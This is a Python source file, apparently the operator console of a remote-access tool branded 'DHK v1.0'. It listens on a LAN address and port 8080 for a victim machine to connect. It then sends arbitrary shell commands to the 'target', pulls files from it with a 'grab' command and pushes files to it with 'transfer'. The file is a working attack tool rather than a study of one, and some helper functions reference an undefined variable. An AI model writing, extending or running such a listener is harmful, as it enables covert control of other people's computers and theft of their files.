import socket
import json
import os
import time


class bcolors:
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'


def banner():
	print(bcolors.GREEN + '''  

**\__________________________Tarek Dhk______________________________________/**
    ((((
       - -                        /                           ( \> > |
   -/~/ / ~\                     :;                \       _  > /(~\/
  || | | /\ ;\                   |l      _____     |;     ( \/    > >
  _//)\)\)/ ;;;                  `8o __-~     ~\   d|      \      //
 ///(())(__/~;;\                  "88p;.  -. _\_;.oP        (_._/ /
(((__   __ ))   \                  `>,% (\  (\./)8"         ;:'  i
)))--`.'-- (( ;,8 \               ,;%%%:  ./V^^^V'          ;.   ;.
((\   |   /)) .,88  `: ..,,;;;;,-::::::'_::\   ||\         ;[8:   ;
 )|  ~-~  |(|(888; ..``'::::8888oooooo.  :\`^^^/,,~--._    |88::  |
 |\ -===- /|  \8;; ``:.      oo.8888888888:`((( o.ooo8888Oo;:;:'  |
 |_~-___-~_|   `-\.   `        `o`88888888b` )) 888b88888P""'     ;
 ; ~~~~;~~         "`--_`.       b`888888888;(.,"888b888"  ..::;-'
   ;      ;              ~"-....  b`8888888:::::.`8888. .:;;;''
      ;    ;                 `:::. `:::OOO:::::::.`OO' ;;;''
 :       ;                     `.      "``::::::''    .'
    ;                           `.   \_              /
  ;       ;                       +:   ~~--  `:'  -';
                                   `:         : .::/
      ;                            ;;+_  :::. :..;;;
                                   ;;;;;;,;;;;;;;;,;                       ''')

	print(bcolors.RED + '                                                         +[+[+[ DHK v1.0 ]+]+]+')
	print(bcolors.RED + '                                                        +[+[+[ made with DHK Team ]+]+]+')
print(banner())



def reliable_send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())

def reliable_recv():
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def upload_file(file_name):
        f = open(file_name, 'rb')
        target.send(f.read())


def download_file(file_name):
	f = open(file_name, 'wb')
	target.settimeout(1)
	chunk = target.recv(1024)
	while chunk:
		f.write(chunk)
		try:
			chunk = target.recv(1024)
		except socket.timeout as e:
			break
	target.settimeout(None)
	f.close()


def target_communication():
	r = conn.recv(5120).decode('utf-8')
	# If Response Contains "dir:"
	# It Means It Contains Target's Current Working Directory
	if ('dir:' in r):
		# Extract Working Directory
		# Skip 4 Characters
		# Because They Are 'd', 'i', 'r', ':'
		cwd = r[4:]

	while True:
		# Input Command From User
		command = input(str(cwd) + ":> ")

		if 'terminate' in command:
			# Send Command To Target
			conn.send('terminate'.encode('utf-8'))

			# Close Connection
			conn.close()

			# Break Loop
			break


		elif 'grab' in command:
			# Send Command
			conn.send(command.encode('utf-8'))

			# Recieve Filename
			file_name = conn.recv(1024).decode('utf-8')
			print("[+] Grabbing [" + file_name + "]...")

			# Send Response
			conn.send('OK'.encode('utf-8'))

			# Recieve Filesize
			file_size = conn.recv(1024).decode('utf-8')

			# Send Response
			conn.send('OK'.encode('utf-8'))

			# Print Size Of File In KB
			print("[Info] Total: " + str(int(file_size) / 1024) + " KB")

			# Open File For Writing
			with open(file_name, "wb") as file:

				# File Will Be Recieved In Small Chunks Of Data
				# Chunks Recieved
				c = 0

				# Starting Time
				start_time = time.time()

				# Running Loop Until c < int(file_size)
				while c < int(file_size):

					# Recieve Bytes
					data = conn.recv(1024)

					# Break If No Data
					if not (data):
						break

					# Write Data To File
					file.write(data)

					# Chunks Recieved
					c += len(data)

				# Ending the time capture.
				end_time = time.time()

			# Show Time
			print("[+] File Grabbed. Total time: ", end_time - start_time)

		elif 'transfer' in command:
			conn.send(command.encode('utf-8'))

			# Getting File Details
			file_name = command[9:]
			file_size = os.path.getsize(file_name)

			# Sending Filename
			conn.send(file_name.encode('utf-8'))

			# Recieve And Print Response
			print(conn.recv(1024).decode('utf-8'))

			# Send File Size
			conn.send(str(file_size).encode('utf-8'))

			print("Getting Response")
			print(conn.recv(1024).decode('utf-8'))

			print("[+] Transferring [" + str(file_size / 1024) + "] KB...")

			# Open File For Reading
			with open(file_name, "rb") as file:

				# Chunks Sent
				c = 0

				# Starting Time
				start_time = time.time()

				# Running Loop Until c < int(file_size)
				while c < int(file_size):

					# Read 1024 Bytes
					data = file.read(1024)

					# If No Data? Break The Loop
					if not (data):
						break

					# Send Data To Target
					conn.sendall(data)

					# Chunks Added
					c += len(data)

				# Ending Time
				end_time = time.time()

				print("[+] File Transferred. Total time: ", end_time - start_time)

		# Otherwise If Command Is Not Null
		elif (len(command.strip()) > 0):

			# Send Command To Target
			conn.send(command.encode('utf-8'))

			# Read Reply From Target
			r = conn.recv(5120).decode('utf-8')

			# If 'dir:' in Reply? Target Has Sent It's Working Directory
			if ('dir:' in r):

				# Get Working Directory
				cwd = r[4:]
			else:

				# Otherwise Print Reply
				print(r)



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.16', 8080))
print(bcolors.RED +'[+] Listening For The Incoming Connections')
sock.listen(5)
conn, addr = sock.accept()




print(bcolors.YELLOW +'[+] Target Connected From: ' + str(addr))
target_communication()
